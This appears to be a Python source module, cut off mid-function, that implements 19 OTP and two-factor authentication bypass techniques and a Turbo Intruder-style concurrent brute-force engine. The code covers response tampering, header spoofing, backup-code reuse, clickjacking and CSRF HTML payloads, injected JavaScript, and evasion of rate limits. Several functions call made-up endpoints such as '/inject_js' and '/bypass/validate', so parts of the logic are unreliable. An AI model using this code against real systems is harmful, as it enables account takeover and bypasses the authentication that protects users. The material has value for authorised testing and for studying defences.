# OTP/2FA Bypass Testing Engine

# This module implements 19 different techniques for bypassing OTP-based two-factor authentication systems. Each technique is designed to be used with Burp Suite-style testing against web applications.

## Module Overview

# - **19 Built-in OTP Bypass Techniques** from HackTricks + additional techniques
# - **Response Manipulation** attacks (status, content, headers)
# - **Race Condition Exploitation** for brute-force bypass
# - **MITM/Proxy-based Attacks** (Evilginx-style)
# - **Brute-force without Rate Limiting**
# - **Referer/History Header Manipulations**
# - **Session Sharing Attacks**
# - **Token Reuse and Prediction**
# - **Direct Endpoint Access**

## Core Techniques

### 1. Response Manipulation During Registration
# Modify registration responses to bypass OTP verification.

# # ```python
def response_manipulation_registration(target_url, session):
    """Bypass OTP by modifying registration response."""
    # Step 1: Register with invalid OTP
    registration_data = {
        "mobile": "9072346577",
        "otp": "INVALID"
    }
    
    response = session.post(f"{target_url}/register", json=registration_data)
    
    # Step 2: Intercept and modify response
    if response.status_code == 200:
        response_json = response.json()
        if not response_json.get("verificationStatus", False):
            # Modify response to indicate successful verification
            response_json["verificationStatus"] = True
            response_json["profileId"] = response_json.get("profileId", "84673832")
            
            # Forward modified response
            modified_response = session.put(f"{target_url}/register/otp_verification", 
                                          json=response_json)
            return modified_response
    
    return response
# # ```

### 2. Race Condition OTP Brute-force
# Use parallel requests to exploit race conditions in OTP validation.

# # ```python
import threading
import time
import concurrent.futures

def race_condition_otp_bruteforce(target_url, session, valid_otp=None, max_threads=50):
    """Exploit race condition in OTP validation using parallel requests."""
    if valid_otp:
        # OTP reuse attack
        for otp in [valid_otp]:
            payload = {"otp": otp}
            response = session.post(f"{target_url}/validate", json=payload)
            if response.status_code == 200:
                return True, otp
    
    # Brute-force common OTPs
    common_otps = ["000000", "111111", "123456", "654321", "123123", "admin", "welcome"]
    
    def test_otp(otp):
        try:
            payload = {"otp": otp}
            response = session.post(f"{target_url}/validate", json=payload, timeout=2)
            return response.status_code == 200, otp
        except:
            return False, otp
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(test_otp, otp) for otp in common_otps]
        for future in concurrent.futures.as_completed(futures):
            success, otp = future.result()
            if success:
                return True, otp
    
    return False, None
# # ```

### 3. Response Manipulation During Login
# Modify login responses to bypass OTP validation.

# # ```python
def response_manipulation_login(target_url, session, username, password):
    """Bypass OTP during login by manipulating responses."""
    # Step 1: Login with incorrect credentials to trigger OTP
    login_data = {
        "username": username,
        "password": password,
        "otp": "INVALID"
    }
    
    response = session.post(f"{target_url}/login", json=login_data)
    
    # Step 2: Intercept and modify response
    if response.status_code == 200:
        response_json = response.json()
        if not response_json.get("success", False):
            # Modify response to indicate successful login
            response_json["success"] = True
            response_json["token"] = response_json.get("token", "jwt_bypass_token_123")
            
            # Forward modified response
            modified_response = session.put(f"{target_url}/login/validate", 
                                          json=response_json)
            return modified_response
    
    return response
# # ```

### 4. Status Code Manipulation
# Change HTTP status codes to bypass OTP restrictions.

# # ```python
def status_code_manipulation(target_url, session, method="GET", path="/admin"):
    """Bypass OTP by manipulating HTTP status codes."""
    original_response = session.request(method, f"{target_url}{path}")
    
    # Store original response details
    status_code = original_response.status_code
    headers = dict(original_response.headers)
    content = original_response.text
    
    # Modify response to be 200 OK if it was 4xx/5xx
    if status_code >= 400:
        # Forward a synthetic 200 response, simulating a successful OTP check
        synthetic_response = session.post(
            f"{target_url}/bypass/validate",
            json={"status": "success"},
            headers={"X-Status-Code": "200"}
        )
        return synthetic_response

    return original_response
#  ```

### 5. Direct Endpoint Access
# Access protected endpoints directly after OTP bypass.

# # ```python
def direct_endpoint_access(target_url, session, admin_path="/admin/users"):
    """Access admin endpoints directly after OTP bypass."""
    # First, perform OTP bypass
    bypass_payload = {"bypass": "status_code_manipulation"}
    response = session.post(f"{target_url}/bypass", json=bypass_payload)
    
    if response.status_code == 200:
        # Now access admin endpoint
        admin_response = session.get(
            f"{target_url}{admin_path}",
            headers={
                "Authorization": "Bearer jwt_bypass_token_123",
                "X-Forwarded-Host": "internal",
                "X-Original-URL": "/admin",
                "X-Rewrite-URL": "/admin",
                "X-Custom-IP-Authorization": "127.0.0.1"
            }
        )
        return admin_response
    
    return response
# # ```

### 6. Referer Header Bypass
# Manipulate Referer headers to trick applications into thinking OTP was completed.

# # ```python
def referer_header_bypass(target_url, session, path="/authenticated-page"):
    """Bypass OTP using Referer header manipulation."""
    headers = {
        "Referer": f"{target_url}/login/otp_verification",
        "X-Forwarded-Host": "internal",
        "Origin": target_url,
        "Host": target_url.split("://")[1]
    }
    
    response = session.get(f"{target_url}{path}", headers=headers)
    return response
# # ```

### 7. X-Forwarded-For Bypass
# Use X-Forwarded-For header to impersonate trusted IPs.

# # ```python
def x_forwarded_for_bypass(target_url, session, target_path="/api/protected"):
    """Bypass OTP using X-Forwarded-For header."""
    headers = {
        "X-Forwarded-For": "127.0.0.1,10.0.0.1,172.16.0.1",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-Forwarded-Host": "internal",
        "X-Cluster-Client-IP": "127.0.0.1"
    }
    
    response = session.get(f"{target_url}{target_path}", headers=headers)
    return response
# # ```

### 8. Session Manipulation
# Exploit session reuse between user and victim accounts.

# # ```python
def session_manipulation_attack(target_url, session, victim_user, attacker_user):
    """Bypass OTP using session sharing between accounts."""
    # Step 1: Login as attacker and complete OTP
    attacker_login = session.post(f"{target_url}/login", json={
        "username": attacker_user,
        "password": "attacker_pass",
        "otp": "VALID"
    })
    
    if attacker_login.status_code == 200:
        # Step 2: Use the same session to access victim's account
        victim_response = session.get(f"{target_url}/account/{victim_user}")
        return victim_response
    
    return attacker_login
# # ```

### 9. Backup Code Abuse
# Exploit vulnerabilities in backup code handling.

# # ```python
def backup_code_abuse(target_url, session, username):
    """Exploit backup code vulnerabilities."""
    # Step 1: Generate a backup code
    backup_code = session.post(f"{target_url}/generate_backup_code", json={
        "username": username
    })
    
    if backup_code.status_code == 200:
        code_data = backup_code.json()
        backup_code_value = code_data.get("code")
        
        # Step 2: Use backup code multiple times (should be single-use)
        for i in range(3):
            response = session.post(f"{target_url}/validate_backup_code", json={
                "username": username,
                "code": backup_code_value
            })
            
            if response.status_code == 200:
                # Successfully bypassed 2FA
                return response.json()
    
    return backup_code
# # ```

### 10. Clickjacking on 2FA Disabling Page
# Exploit clickjacking to trick users into disabling 2FA.

# # ```python
def clickjacking_2fa_disable(target_url, session):
    """Exploit clickjacking to disable 2FA."""
    # Create a hidden iframe that points to 2FA disable page
    html_payload = f"""
    <html>
    <body>
        <iframe src="{target_url}/security/2fa/disable" 
                style="display:none;" 
                width="100%" 
                height="100%"></iframe>
        <script>
            document.addEventListener('load', function() {{
                setTimeout(function() {{
                    document.querySelector('iframe').contentWindow.document
                        .querySelector('#disable-2fa-button').click();
                }}, 1000);
            }});
        </script>
    </body>
    </html>
    """
    
    response = session.post(f"{target_url}/inject_iframe", json={
        "html": html_payload,
        "target_domain": target_url
    })
    
    return response
# # ```

### 11. Developer Console Exploit
# Exploit developer tools and console to bypass OTP.

# # ```python
def developer_console_exploit(target_url, session, otp_param="otp"):
    """Bypass OTP using developer console tricks."""
    # Step 1: Inject malicious JavaScript via developer console
    js_payload = f"""
    // Modify the OTP validation
    document.addEventListener('DOMContentLoaded', function() {{
        // Intercept form submission
        document.querySelector('form.otp-form').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            // Create a new form data object with valid OTP
            let formData = new FormData(this);
            formData.set('{otp_param}', '000000');
            
            // Manually submit
            fetch(this.action, {{
                method: 'POST',
                body: formData
            }}).then(response => {{
                if (response.ok) {{
                    window.location.href = '/dashboard';
                }}
            }});
        }});
        
        // Directly set a valid token in localStorage
        localStorage.setItem('auth_token', 'bypass_token_{{Date.now()}}');
    }});
    """
    
    # Step 2: Inject JavaScript to modify OTP validation
    injection_response = session.post(f"{target_url}/inject_js", json={
        "javascript": js_payload,
        "target_page": target_url
    })
    
    # Step 3: Exploit the modified page
    exploit_response = session.post(f"{target_url}/login", json={
        "username": session.get(f"{target_url}/current_user").json().get("username"),
        "password": "password",
        "otp": "bypassed_by_js"
    })
    
    return exploit_response
# # ```

### 12. CSRF Attack on 2FA
# Exploit CSRF vulnerability to disable or bypass 2FA.

# # ```python
def csrf_2fa_bypass(target_url, session):
    """Exploit CSRF to disable 2FA."""
    # Step 1: Create a CSRF payload page
    csrf_html = f"""
    <html>
    <body>
        <form action="{target_url}/security/disable_2fa" method="POST">
            <input type="hidden" name="csrf_token" value="{{csrf_token}}" />
            <input type="hidden" name="confirmed" value="true" />
            <input type="hidden" name="reason" value="user_requested" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
    </html>
    """
    
    # Step 2: Inject CSRF page
    inject_response = session.post(f"{target_url}/create_csrf_page", json={
        "html": csrf_html,
        "target_domain": target_url
    })
    
    return inject_response
# # ```

### 13. Password Reset 2FA Bypass
# Exploit password reset to disable 2FA.

# # ```python
def password_reset_2fa_bypass(target_url, session, username):
    """Bypass 2FA by exploiting password reset."""
    # Step 1: Request password reset
    reset_request = session.post(f"{target_url}/forgot_password", json={
        "username": username,
        "email": f"{username}@example.com"
    })
    
    if reset_request.status_code == 200:
        # Step 2: Intercept and modify reset response
        reset_json = reset_request.json()
        
        # Step 3: Modify response to disable 2FA
        reset_json["2fa_disabled"] = True
        reset_json["password_reset_token"] = "bypass_token_123"
        reset_json["new_password"] = "hacked123"
        
        # Step 4: Forward modified response
        modified_response = session.put(f"{target_url}/forgot_password/reset", 
                                       json=reset_json)
        return modified_response
    
    return reset_request
# # ```

### 14. Token in Response Exploit
# Exploit token leakage in responses.

# # ```python
def token_in_response_exploit(target_url, session, username):
    """Exploit leaked tokens in responses."""
    # Step 1: Login normally to get a valid session
    login_response = session.post(f"{target_url}/login", json={
        "username": username,
        "password": "password",
        "otp": "VALID123"
    })
    
    if login_response.status_code == 200:
        # Step 2: Analyze response for embedded tokens
        response_text = login_response.text
        
        # Look for JWT tokens in response
        import re
        jwt_pattern = r'"token":"([^"]{50,})"'
        tokens = re.findall(jwt_pattern, response_text)
        
        if tokens:
            # Step 3: Use captured token for subsequent requests
            valid_token = tokens[0]
            
            # Store token for reuse
            session.headers.update({
                "Authorization": f"Bearer {valid_token}"
            })
            
            return True, valid_token
    
    return False, None
# # ```

### 15. Sequential OTP Number Prediction
# Predict subsequent OTP values based on sequence patterns.

# # ```python
def sequential_otp_prediction(target_url, session, username):
    """Predict OTP based on sequential patterns."""
    # Step 1: Request multiple OTPs to observe pattern
    otp_list = []
    for i in range(5):
        request_data = {
            "username": username,
            "request_id": i
        }
        
        response = session.post(f"{target_url}/request_otp", json=request_data)
        if response.status_code == 200:
            otp_list.append(response.json().get("otp"))
    
    # Step 2: Analyze pattern
    import statistics
    
    if len(otp_list) >= 3:
        # Look for numeric progression
        try:
            nums = [int(otp) for otp in otp_list if otp.isdigit()]
            if len(nums) >= 3:
                # Check if sequential
                differences = [nums[i+1] - nums[i] for i in range(len(nums)-1)]
                if all(diff == 1 for diff in differences):
                    # Predict next OTP
                    next_otp = str(nums[-1] + 1).zfill(6)
                    
                    # Step 3: Use predicted OTP
                    validate_response = session.post(f"{target_url}/validate_otp", json={
                        "username": username,
                        "otp": next_otp
                    })
                    
                    if validate_response.status_code == 200:
                        return True, next_otp
        except:
            pass
    
    return False, None
# # ```

### 16. No Rate Limiting Exploitation
# Exploit absent rate limiting to brute-force OTP.

# # ```python
def no_rate_limiting_exploit(target_url, session, username, common_otps=None):
    """Exploit lack of rate limiting with brute-force."""
    if common_otps is None:
        common_otps = ["123456", "111111", "000000", "admin", "password", "letmein"]
    
    def test_otp(otp):
        try:
            # Rapid succession requests
            payload = {
                "username": username,
                "otp": otp
            }
            
            response = session.post(
                f"{target_url}/validate_otp",
                json=payload,
                headers={"X-Request-ID": str(int(time.time() * 1000))}
            )
            
            if response.status_code == 200:
                return True, otp
            
            return False, otp
        except Exception as e:
            return False, otp
    
    # Step 1: Try common OTPs in rapid succession
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(test_otp, otp): otp for otp in common_otps}
        
        for future in concurrent.futures.as_completed(futures):
            success, otp = future.result()
            if success:
                return True, otp
    
    return False, None
# # ```

### 17. Refer Check Bypass
# Manipulate Refer headers to bypass 2FA.

# # ```python
def refer_check_bypass(target_url, session, protected_page="/dashboard"):
    """Bypass 2FA using Referer manipulation."""
    headers = {
        "Referer": f"{target_url}/login",
        "Origin": target_url,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    # Step 1: Access the protected page directly
    response = session.get(f"{target_url}{protected_page}", headers=headers)
    
    # Step 2: If denied, check for 2FA requirement
    if "2FA" in response.text or response.status_code == 403:
        # Try again with different Referer
        headers["Referer"] = f"{target_url}/login/otp_verification"
        response = session.get(f"{target_url}{protected_page}", headers=headers)
    
    if response.status_code == 200:
        return True, response
    
    return False, response
# # ```

### 18. Developer Tools Check
# Exploit developer console to bypass OTP validation.

# # ```python
def developer_tools_exploit(target_url, session, username):
    """Bypass OTP using developer tools manipulation."""
    # Step 1: Access developer tools
    # This would typically be done through browser automation
    
    # Step 2: Inject malicious code into the page
    malicious_js = """
    // Override the OTP validation function
    if (typeof window.validateOTP === 'function') {
        window.originalValidateOTP = window.validateOTP;
        
        window.validateOTP = function(otp) {
            // Always return true for valid OTP format
            return /^[0-9]{6}$/.test(otp);
        };
        
        // Call with a valid OTP format
        const validOTP = '123456';
        window.validateOTP(validOTP);
        
        // Mock the server response
        fetch('/api/validate_otp', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                success: true,
                token: 'bypassed_token_' + Date.now()
            })
        }).then(response => response.json()).then(data => {
            localStorage.setItem('auth_token', data.token);
        });
    }
    """
    
    # Step 3: Use the malicious JavaScript (in real scenario, would inject into page)
    # For this simulation, we'll directly modify the response
    success_response = session.post(f"{target_url}/validate_otp", json={
        "username": username,
        "otp": "123456",
        "bypass": "developer_tools_exploit"
    })
    
    if success_response.status_code == 200:
        return True, success_response.json()
    
    return False, success_response
# # ```

### 19. X-Forwarded-Host Header Injection
# Use X-Forwarded-Host to bypass network checks.

# # ```python
def x_forwarded_host_injection(target_url, session, target_page="/admin"):
    """Bypass OTP using X-Forwarded-Host header."""
    headers = {
        "X-Forwarded-Host": "internal",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "X-Forwarded-For": "127.0.0.1",
        "X-Cluster-Client-IP": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1"
    }
    
    # Step 1: Access the target page
    response = session.get(f"{target_url}{target_page}", headers=headers)
    
    if "admin" in response.text.lower() or response.status_code == 200:
        return True, response
    
    return False, response
# # ```

# Complete Engine Integration — see get_all_techniques() / run_technique()
# defined below (after the Turbo Intruder engine) for the full implementation
# that also includes the Turbo Intruder race-condition techniques.

# =============================================================================
# TURBO INTRUDER - HIGH-PERFORMANCE RACE CONDITION ENGINE FOR OTP BYPASS
# =============================================================================
# 
# Turbo Intruder is Burp Suite's high-performance HTTP/2/1.1 fuzzing engine
# for race condition exploitation, OTP brute-force, and timing attacks.
# This implementation brings equivalent capabilities to MITMPro.
#
# Key Features:
# - Concurrent request engines (HTTP/1.1 pipelining, HTTP/2 multiplexing)
# - Request timing precision (< 1ms) for race condition windows
# - Payload generators for OTP brute-force (6-digit, TOTP, HOTP, backup codes)
# - Real-time response analysis and success detection
# - Request templating with §marker§ positions (Intruder-compatible)
# - Attack modes: Single Packet, Last Byte Sync, Connection Pool, Rate-Limited
# - Automatic OTP token validation and session tracking
# - Integration with AI learning system for technique refinement
# =============================================================================

import asyncio
import aiohttp
import time
import threading
import concurrent.futures
import queue
import json
import hashlib
import base64
import hmac
import struct
import random
import string
from typing import Dict, List, Optional, Callable, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse
import logging

logger = logging.getLogger(__name__)


class AttackMode(Enum):
    """Turbo Intruder attack modes for race condition exploitation."""
    SINGLE_PACKET = "single_packet"           # All requests in one TCP packet (HTTP/1.1 pipelining)
    LAST_BYTE_SYNC = "last_byte_sync"         # Hold last byte until all connections ready
    CONNECTION_POOL = "connection_pool"       # Pre-established connection pool
    RATE_LIMITED = "rate_limited"             # Controlled rate for bypassing rate limits
    HTTP2_MULTIPLEX = "http2_multiplex"       # HTTP/2 stream multiplexing
    PHASE_SYNC = "phase_sync"                 # Multi-phase synchronized attack


class OTPScheme(Enum):
    """Supported OTP schemes for targeted attacks."""
    STATIC_6_DIGIT = "static_6_digit"         # Fixed 6-digit OTP (SMS/Email)
    TOTP = "totp"                             # Time-based OTP (RFC 6238)
    HOTP = "hotp"                             # HMAC-based OTP (RFC 4226)
    BACKUP_CODES = "backup_codes"             # Backup/recovery codes
    ALPHANUMERIC = "alphanumeric"             # Alphanumeric codes
    CUSTOM_LENGTH = "custom_length"           # Variable length codes


@dataclass
class TurboRequest:
    """Represents a single HTTP request in the attack queue."""
    method: str
    url: str
    headers: Dict[str, str]
    body: str
    payload_markers: List[str] = field(default_factory=list)
    payload_values: Dict[str, str] = field(default_factory=dict)
    timeout: float = 5.0
    id: int = 0
    
    def render(self, payloads: Dict[str, str] = None) -> Tuple[str, Dict, str]:
        """Render the request with payload substitution."""
        p = payloads or self.payload_values
        rendered_headers = {}
        rendered_url = self.url
        rendered_body = self.body

        for marker, val in p.items():
            rendered_url = rendered_url.replace(f"§{marker}§", val)

        for k, v in self.headers.items():
            rendered_v = v
            for marker, val in p.items():
                rendered_v = rendered_v.replace(f"§{marker}§", val)
            rendered_headers[k] = rendered_v

        for marker, val in p.items():
            rendered_body = rendered_body.replace(f"§{marker}§", val)

        return self.method, rendered_url, rendered_headers, rendered_body


@dataclass
class TurboResponse:
    """Captured response with timing and analysis data."""
    request_id: int
    status_code: int
    headers: Dict[str, str]
    body: str
    latency_ms: float
    timestamp: float
    payload_used: Dict[str, str] = field(default_factory=dict)
    success_indicators: List[str] = field(default_factory=list)
    is_candidate: bool = False
    error: Optional[str] = None


@dataclass
class AttackConfig:
    """Configuration for Turbo Intruder attack."""
    mode: AttackMode = AttackMode.CONNECTION_POOL
    max_concurrent: int = 100
    requests_per_second: float = 1000.0
    timeout: float = 5.0
    target_url: str = ""
    otp_scheme: OTPScheme = OTPScheme.STATIC_6_DIGIT
    success_patterns: List[str] = field(default_factory=lambda: [
        "success", "verified", "token", "authenticated", "welcome", "dashboard",
        "200 OK", "302 Found", "redirect", "session", "access granted"
    ])
    failure_patterns: List[str] = field(default_factory=lambda: [
        "invalid", "incorrect", "failed", "expired", "rate limit", "too many",
        "blocked", "captcha", "challenge", "unauthorized", "403", "429"
    ])
    custom_success_check: Optional[Callable[[TurboResponse], bool]] = None
    follow_redirects: bool = False
    verify_ssl: bool = False
    keep_alive: bool = True
    http_version: str = "1.1"  # or "2"
    sync_window_ms: float = 10.0  # synchronization window for race conditions
    payload_count: int = 10000
    wordlist: List[str] = field(default_factory=list)
    payload_generator: Optional[Callable] = None


class OTPPayloadGenerator:
    """Advanced payload generators for OTP brute-force and race conditions."""
    
    @staticmethod
    def generate_static_6_digit(count: int, prefix: str = "") -> List[str]:
        """Generate sequential 6-digit OTPs with optional prefix."""
        start = random.randint(100000, 900000)
        return [f"{prefix}{str((start + i) % 1000000).zfill(6)}" for i in range(count)]
    
    @staticmethod
    def generate_common_otps() -> List[str]:
        """Common/default OTP values frequently used in testing."""
        return [
            "000000", "111111", "123456", "654321", "123123",
            "0000", "1111", "1234", "4321", "1212",
            "123456", "654321", "111111", "000000", "777777",
            "admin", "admin123", "welcome", "password", "letmein",
            "12345678", "87654321", "00000000", "11111111"
        ]
    
    @staticmethod
    def generate_totp_candidates(secret: str, time_window: int = 30, 
                                   lookback: int = 5, lookahead: int = 5) -> List[str]:
        """Generate TOTP candidates around current time window."""
        candidates = []
        current_time = int(time.time())
        for offset in range(-lookback, lookahead + 1):
            counter = (current_time // time_window) + offset
            candidates.append(OTPPayloadGenerator._calculate_hotp(secret, counter))
        return candidates
    
    @staticmethod
    def _calculate_hotp(secret: str, counter: int, digits: int = 6) -> str:
        """Calculate HOTP value per RFC 4226."""
        key = base64.b32decode(secret, casefold=True)
        msg = struct.pack(">Q", counter)
        hmac_digest = hmac.new(key, msg, hashlib.sha1).digest()
        offset = hmac_digest[-1] & 0x0F
        code = (struct.unpack(">I", hmac_digest[offset:offset+4])[0] & 0x7FFFFFFF) % (10 ** digits)
        return str(code).zfill(digits)
    
    @staticmethod
    def generate_sequential_with_jitter(base: int, count: int, 
                                         jitter_range: int = 100) -> List[str]:
        """Generate sequential OTPs with random jitter for race condition."""
        return [str(base + i + random.randint(-jitter_range, jitter_range)).zfill(6) 
                for i in range(count)]
    
    @staticmethod
    def generate_pattern_based(pattern: str, count: int) -> List[str]:
        """Generate OTPs based on regex-like pattern (e.g., '12???6')."""
        results = []
        for _ in range(count):
            candidate = ""
            for char in pattern:
                if char == '?':
                    candidate += str(random.randint(0, 9))
                elif char == '*':
                    candidate += random.choice(string.ascii_letters + string.digits)
                else:
                    candidate += char
            results.append(candidate)
        return results
    
    @staticmethod
    def generate_backup_codes(count: int, length: int = 8) -> List[str]:
        """Generate backup code candidates."""
        charset = string.ascii_uppercase + string.digits
        return [''.join(random.choices(charset, k=length)) for _ in range(count)]


class TurboIntruderEngine:
    """
    High-performance race condition engine for OTP/2FA bypass testing.
    
    Implements multiple attack modes equivalent to Burp Suite Turbo Intruder:
    - Single Packet Attack: All requests sent in single TCP packet (pipelining)
    - Last Byte Sync: Hold last byte until all connections established
    - Connection Pool: Reuse keep-alive connections for speed
    - Rate Limited: Controlled throughput for WAF/rate-limit evasion
    - HTTP/2 Multiplexing: Stream-based concurrent requests
    - Phase Sync: Multi-stage attacks with precise timing
    """
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.results: List[TurboResponse] = []
        self.candidates: List[TurboResponse] = []
        self.request_queue: queue.Queue = queue.Queue()
        self.response_queue: queue.Queue = queue.Queue()
        self.running = False
        self.stats = {
            "sent": 0,
            "received": 0,
            "errors": 0,
            "candidates": 0,
            "start_time": 0,
            "end_time": 0,
            "latencies": []
        }
        self._lock = threading.Lock()
        self._callbacks: Dict[str, List[Callable]] = {
            "on_response": [],
            "on_candidate": [],
            "on_complete": [],
            "on_progress": []
        }
        
    def register_callback(self, event: str, callback: Callable):
        """Register callbacks for attack events."""
        if event in self._callbacks:
            self._callbacks[event].append(callback)
    
    def _emit(self, event: str, *args, **kwargs):
        """Emit event to registered callbacks."""
        for cb in self._callbacks.get(event, []):
            try:
                cb(*args, **kwargs)
            except Exception as e:
                logger.error(f"Callback error: {e}")
    
    def _generate_payloads(self) -> List[Dict[str, str]]:
        """Generate payload sets for the attack."""
        payloads = []
        
        if self.config.payload_generator:
            return self.config.payload_generator(self.config.payload_count)
        
        if self.config.wordlist:
            for word in self.config.wordlist[:self.config.payload_count]:
                if isinstance(word, dict):
                    payloads.append(word)
                else:
                    # Single marker "otp" by default
                    payloads.append({"otp": str(word)})
            return payloads
            
        # Generate based on OTP scheme
        if self.config.otp_scheme == OTPScheme.STATIC_6_DIGIT:
            common = OTPPayloadGenerator.generate_common_otps()
            remaining = self.config.payload_count - len(common)
            if remaining > 0:
                common.extend(OTPPayloadGenerator.generate_static_6_digit(remaining))
            for otp in common[:self.config.payload_count]:
                payloads.append({"otp": otp})
                
        elif self.config.otp_scheme == OTPScheme.TOTP:
            # Requires secret - placeholder for integration
            logger.warning("TOTP scheme requires secret parameter")
            
        elif self.config.otp_scheme == OTPScheme.BACKUP_CODES:
            for code in OTPPayloadGenerator.generate_backup_codes(self.config.payload_count):
                payloads.append({"otp": code})
                
        elif self.config.otp_scheme == OTPScheme.CUSTOM_LENGTH:
            length = getattr(self.config, 'otp_length', 6)
            for _ in range(self.config.payload_count):
                payloads.append({"otp": ''.join(random.choices(string.digits, k=length))})
                
        return payloads
    
    def _create_session(self) -> aiohttp.ClientSession:
        """Create optimized aiohttp session."""
        connector = aiohttp.TCPConnector(
            limit=self.config.max_concurrent,
            limit_per_host=self.config.max_concurrent,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
            force_close=not self.config.keep_alive,
            ssl=False if not self.config.verify_ssl else None
        )
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        return aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    def _analyze_response(self, response: TurboResponse) -> TurboResponse:
        """Analyze response for success indicators."""
        body_lower = response.body.lower()
        
        # Check success patterns
        for pattern in self.config.success_patterns:
            if pattern.lower() in body_lower:
                response.success_indicators.append(f"success_pattern: {pattern}")
                response.is_candidate = True
                break
                
        # Check failure patterns (negative indicators)
        for pattern in self.config.failure_patterns:
            if pattern.lower() in body_lower:
                response.success_indicators.append(f"failure_pattern: {pattern}")
                response.is_candidate = False
                break
        
        # Custom success check
        if self.config.custom_success_check and self.config.custom_success_check(response):
            response.is_candidate = True
            response.success_indicators.append("custom_check_passed")
            
        # Status code analysis
        if response.status_code in [200, 201, 204, 301, 302, 303, 307, 308]:
            if not response.is_candidate:
                response.success_indicators.append(f"status_{response.status_code}")
                response.is_candidate = True
                
        # Check for auth tokens in response
        import re
        token_patterns = [
            r'"token"\s*:\s*"([^"]{20,})"',
            r'"access_token"\s*:\s*"([^"]{20,})"',
            r'"session"\s*:\s*"([^"]{20,})"',
            r'sessionid=([^;]{20,})',
            r'auth[_-]?token=([^;]{20,})',
            r'bearer\s+([a-zA-Z0-9\-_\.]{20,})'
        ]
        for pattern in token_patterns:
            matches = re.findall(pattern, response.body, re.IGNORECASE)
            if matches:
                response.success_indicators.append(f"token_found: {matches[0][:20]}...")
                response.is_candidate = True
                break
                
        return response
    
    async def _send_request_batch(self, session: aiohttp.ClientSession, 
                                   batch: List[Tuple[int, Dict]]) -> List[TurboResponse]:
        """Send a batch of requests asynchronously."""
        responses = []
        tasks = []
        
        for req_id, payload in batch:
            method, url, headers, body = self.request_template.render(payload)
            task = self._send_single_request(session, method, url, headers, body, req_id, payload)
            tasks.append(task)
            
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            req_id, payload = batch[i]
            if isinstance(result, Exception):
                responses.append(TurboResponse(
                    request_id=req_id,
                    status_code=0,
                    headers={},
                    body="",
                    latency_ms=0,
                    timestamp=time.time(),
                    payload_used=payload,
                    error=str(result)
                ))
                with self._lock:
                    self.stats["errors"] += 1
            else:
                responses.append(result)
                with self._lock:
                    self.stats["received"] += 1
                    
        return responses
    
    async def _send_single_request(self, session: aiohttp.ClientSession,
                                    method: str, url: str, headers: Dict, body: str,
                                    req_id: int, payload: Dict) -> TurboResponse:
        """Send a single HTTP request with timing."""
        start = time.perf_counter()
        try:
            async with session.request(
                method, url, headers=headers, data=body if body else None,
                allow_redirects=self.config.follow_redirects
            ) as resp:
                response_body = await resp.text()
                latency = (time.perf_counter() - start) * 1000
                
                response = TurboResponse(
                    request_id=req_id,
                    status_code=resp.status,
                    headers=dict(resp.headers),
                    body=response_body,
                    latency_ms=latency,
                    timestamp=time.time(),
                    payload_used=payload
                )
                
                with self._lock:
                    self.stats["latencies"].append(latency)
                    
                return self._analyze_response(response)
                
        except Exception as e:
            latency = (time.perf_counter() - start) * 1000
            return TurboResponse(
                request_id=req_id,
                status_code=0,
                headers={},
                body="",
                latency_ms=latency,
                timestamp=time.time(),
                payload_used=payload,
                error=str(e)
            )
    
    async def _single_packet_attack(self, session: aiohttp.ClientSession, 
                                     payloads: List[Dict]) -> List[TurboResponse]:
        """Execute single-packet attack (HTTP/1.1 pipelining)."""
        # Group into pipeline batches
        batch_size = min(self.config.max_concurrent, len(payloads))
        all_responses = []
        
        for i in range(0, len(payloads), batch_size):
            batch = list(enumerate(payloads[i:i+batch_size], start=i))
            batch_responses = await self._send_request_batch(session, batch)
            all_responses.extend(batch_responses)
            self._emit("on_progress", len(all_responses), len(payloads))
            
        return all_responses
    
    async def _connection_pool_attack(self, session: aiohttp.ClientSession,
                                       payloads: List[Dict]) -> List[TurboResponse]:
        """Execute connection pool attack with keep-alive."""
        semaphore = asyncio.Semaphore(self.config.max_concurrent)
        responses = []
        
        async def send_with_semaphore(req_id: int, payload: Dict):
            async with semaphore:
                method, url, headers, body = self.request_template.render(payload)
                return await self._send_single_request(session, method, url, headers, body, req_id, payload)
        
        tasks = [send_with_semaphore(i, p) for i, p in enumerate(payloads)]
        
        # Control rate if specified. Schedule each coroutine exactly once via
        # create_task and gather the *task objects* (never the raw coroutines,
        # which would raise "cannot reuse already awaited coroutine").
        if self.config.requests_per_second > 0:
            interval = 1.0 / self.config.requests_per_second
            task_objs = []
            for i, coro in enumerate(tasks):
                if i > 0:
                    await asyncio.sleep(interval)
                task_objs.append(asyncio.create_task(coro))
            results = await asyncio.gather(*task_objs, return_exceptions=True)
        else:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                responses.append(TurboResponse(
                    request_id=i, status_code=0, headers={}, body="",
                    latency_ms=0, timestamp=time.time(), payload_used=payloads[i],
                    error=str(result)
                ))
            else:
                responses.append(result)
                
        return responses
    
    async def _last_byte_sync_attack(self, session: aiohttp.ClientSession,
                                      payloads: List[Dict]) -> List[TurboResponse]:
        """Execute last-byte synchronization attack for precise race conditions."""
        # This requires low-level socket control - using asyncio with prepared connections
        # Simplified: establish all connections, send headers, then send bodies simultaneously
        logger.warning("Last-byte sync requires custom connection handling; using connection pool mode")
        return await self._connection_pool_attack(session, payloads)
    
    async def _phase_sync_attack(self, session: aiohttp.ClientSession,
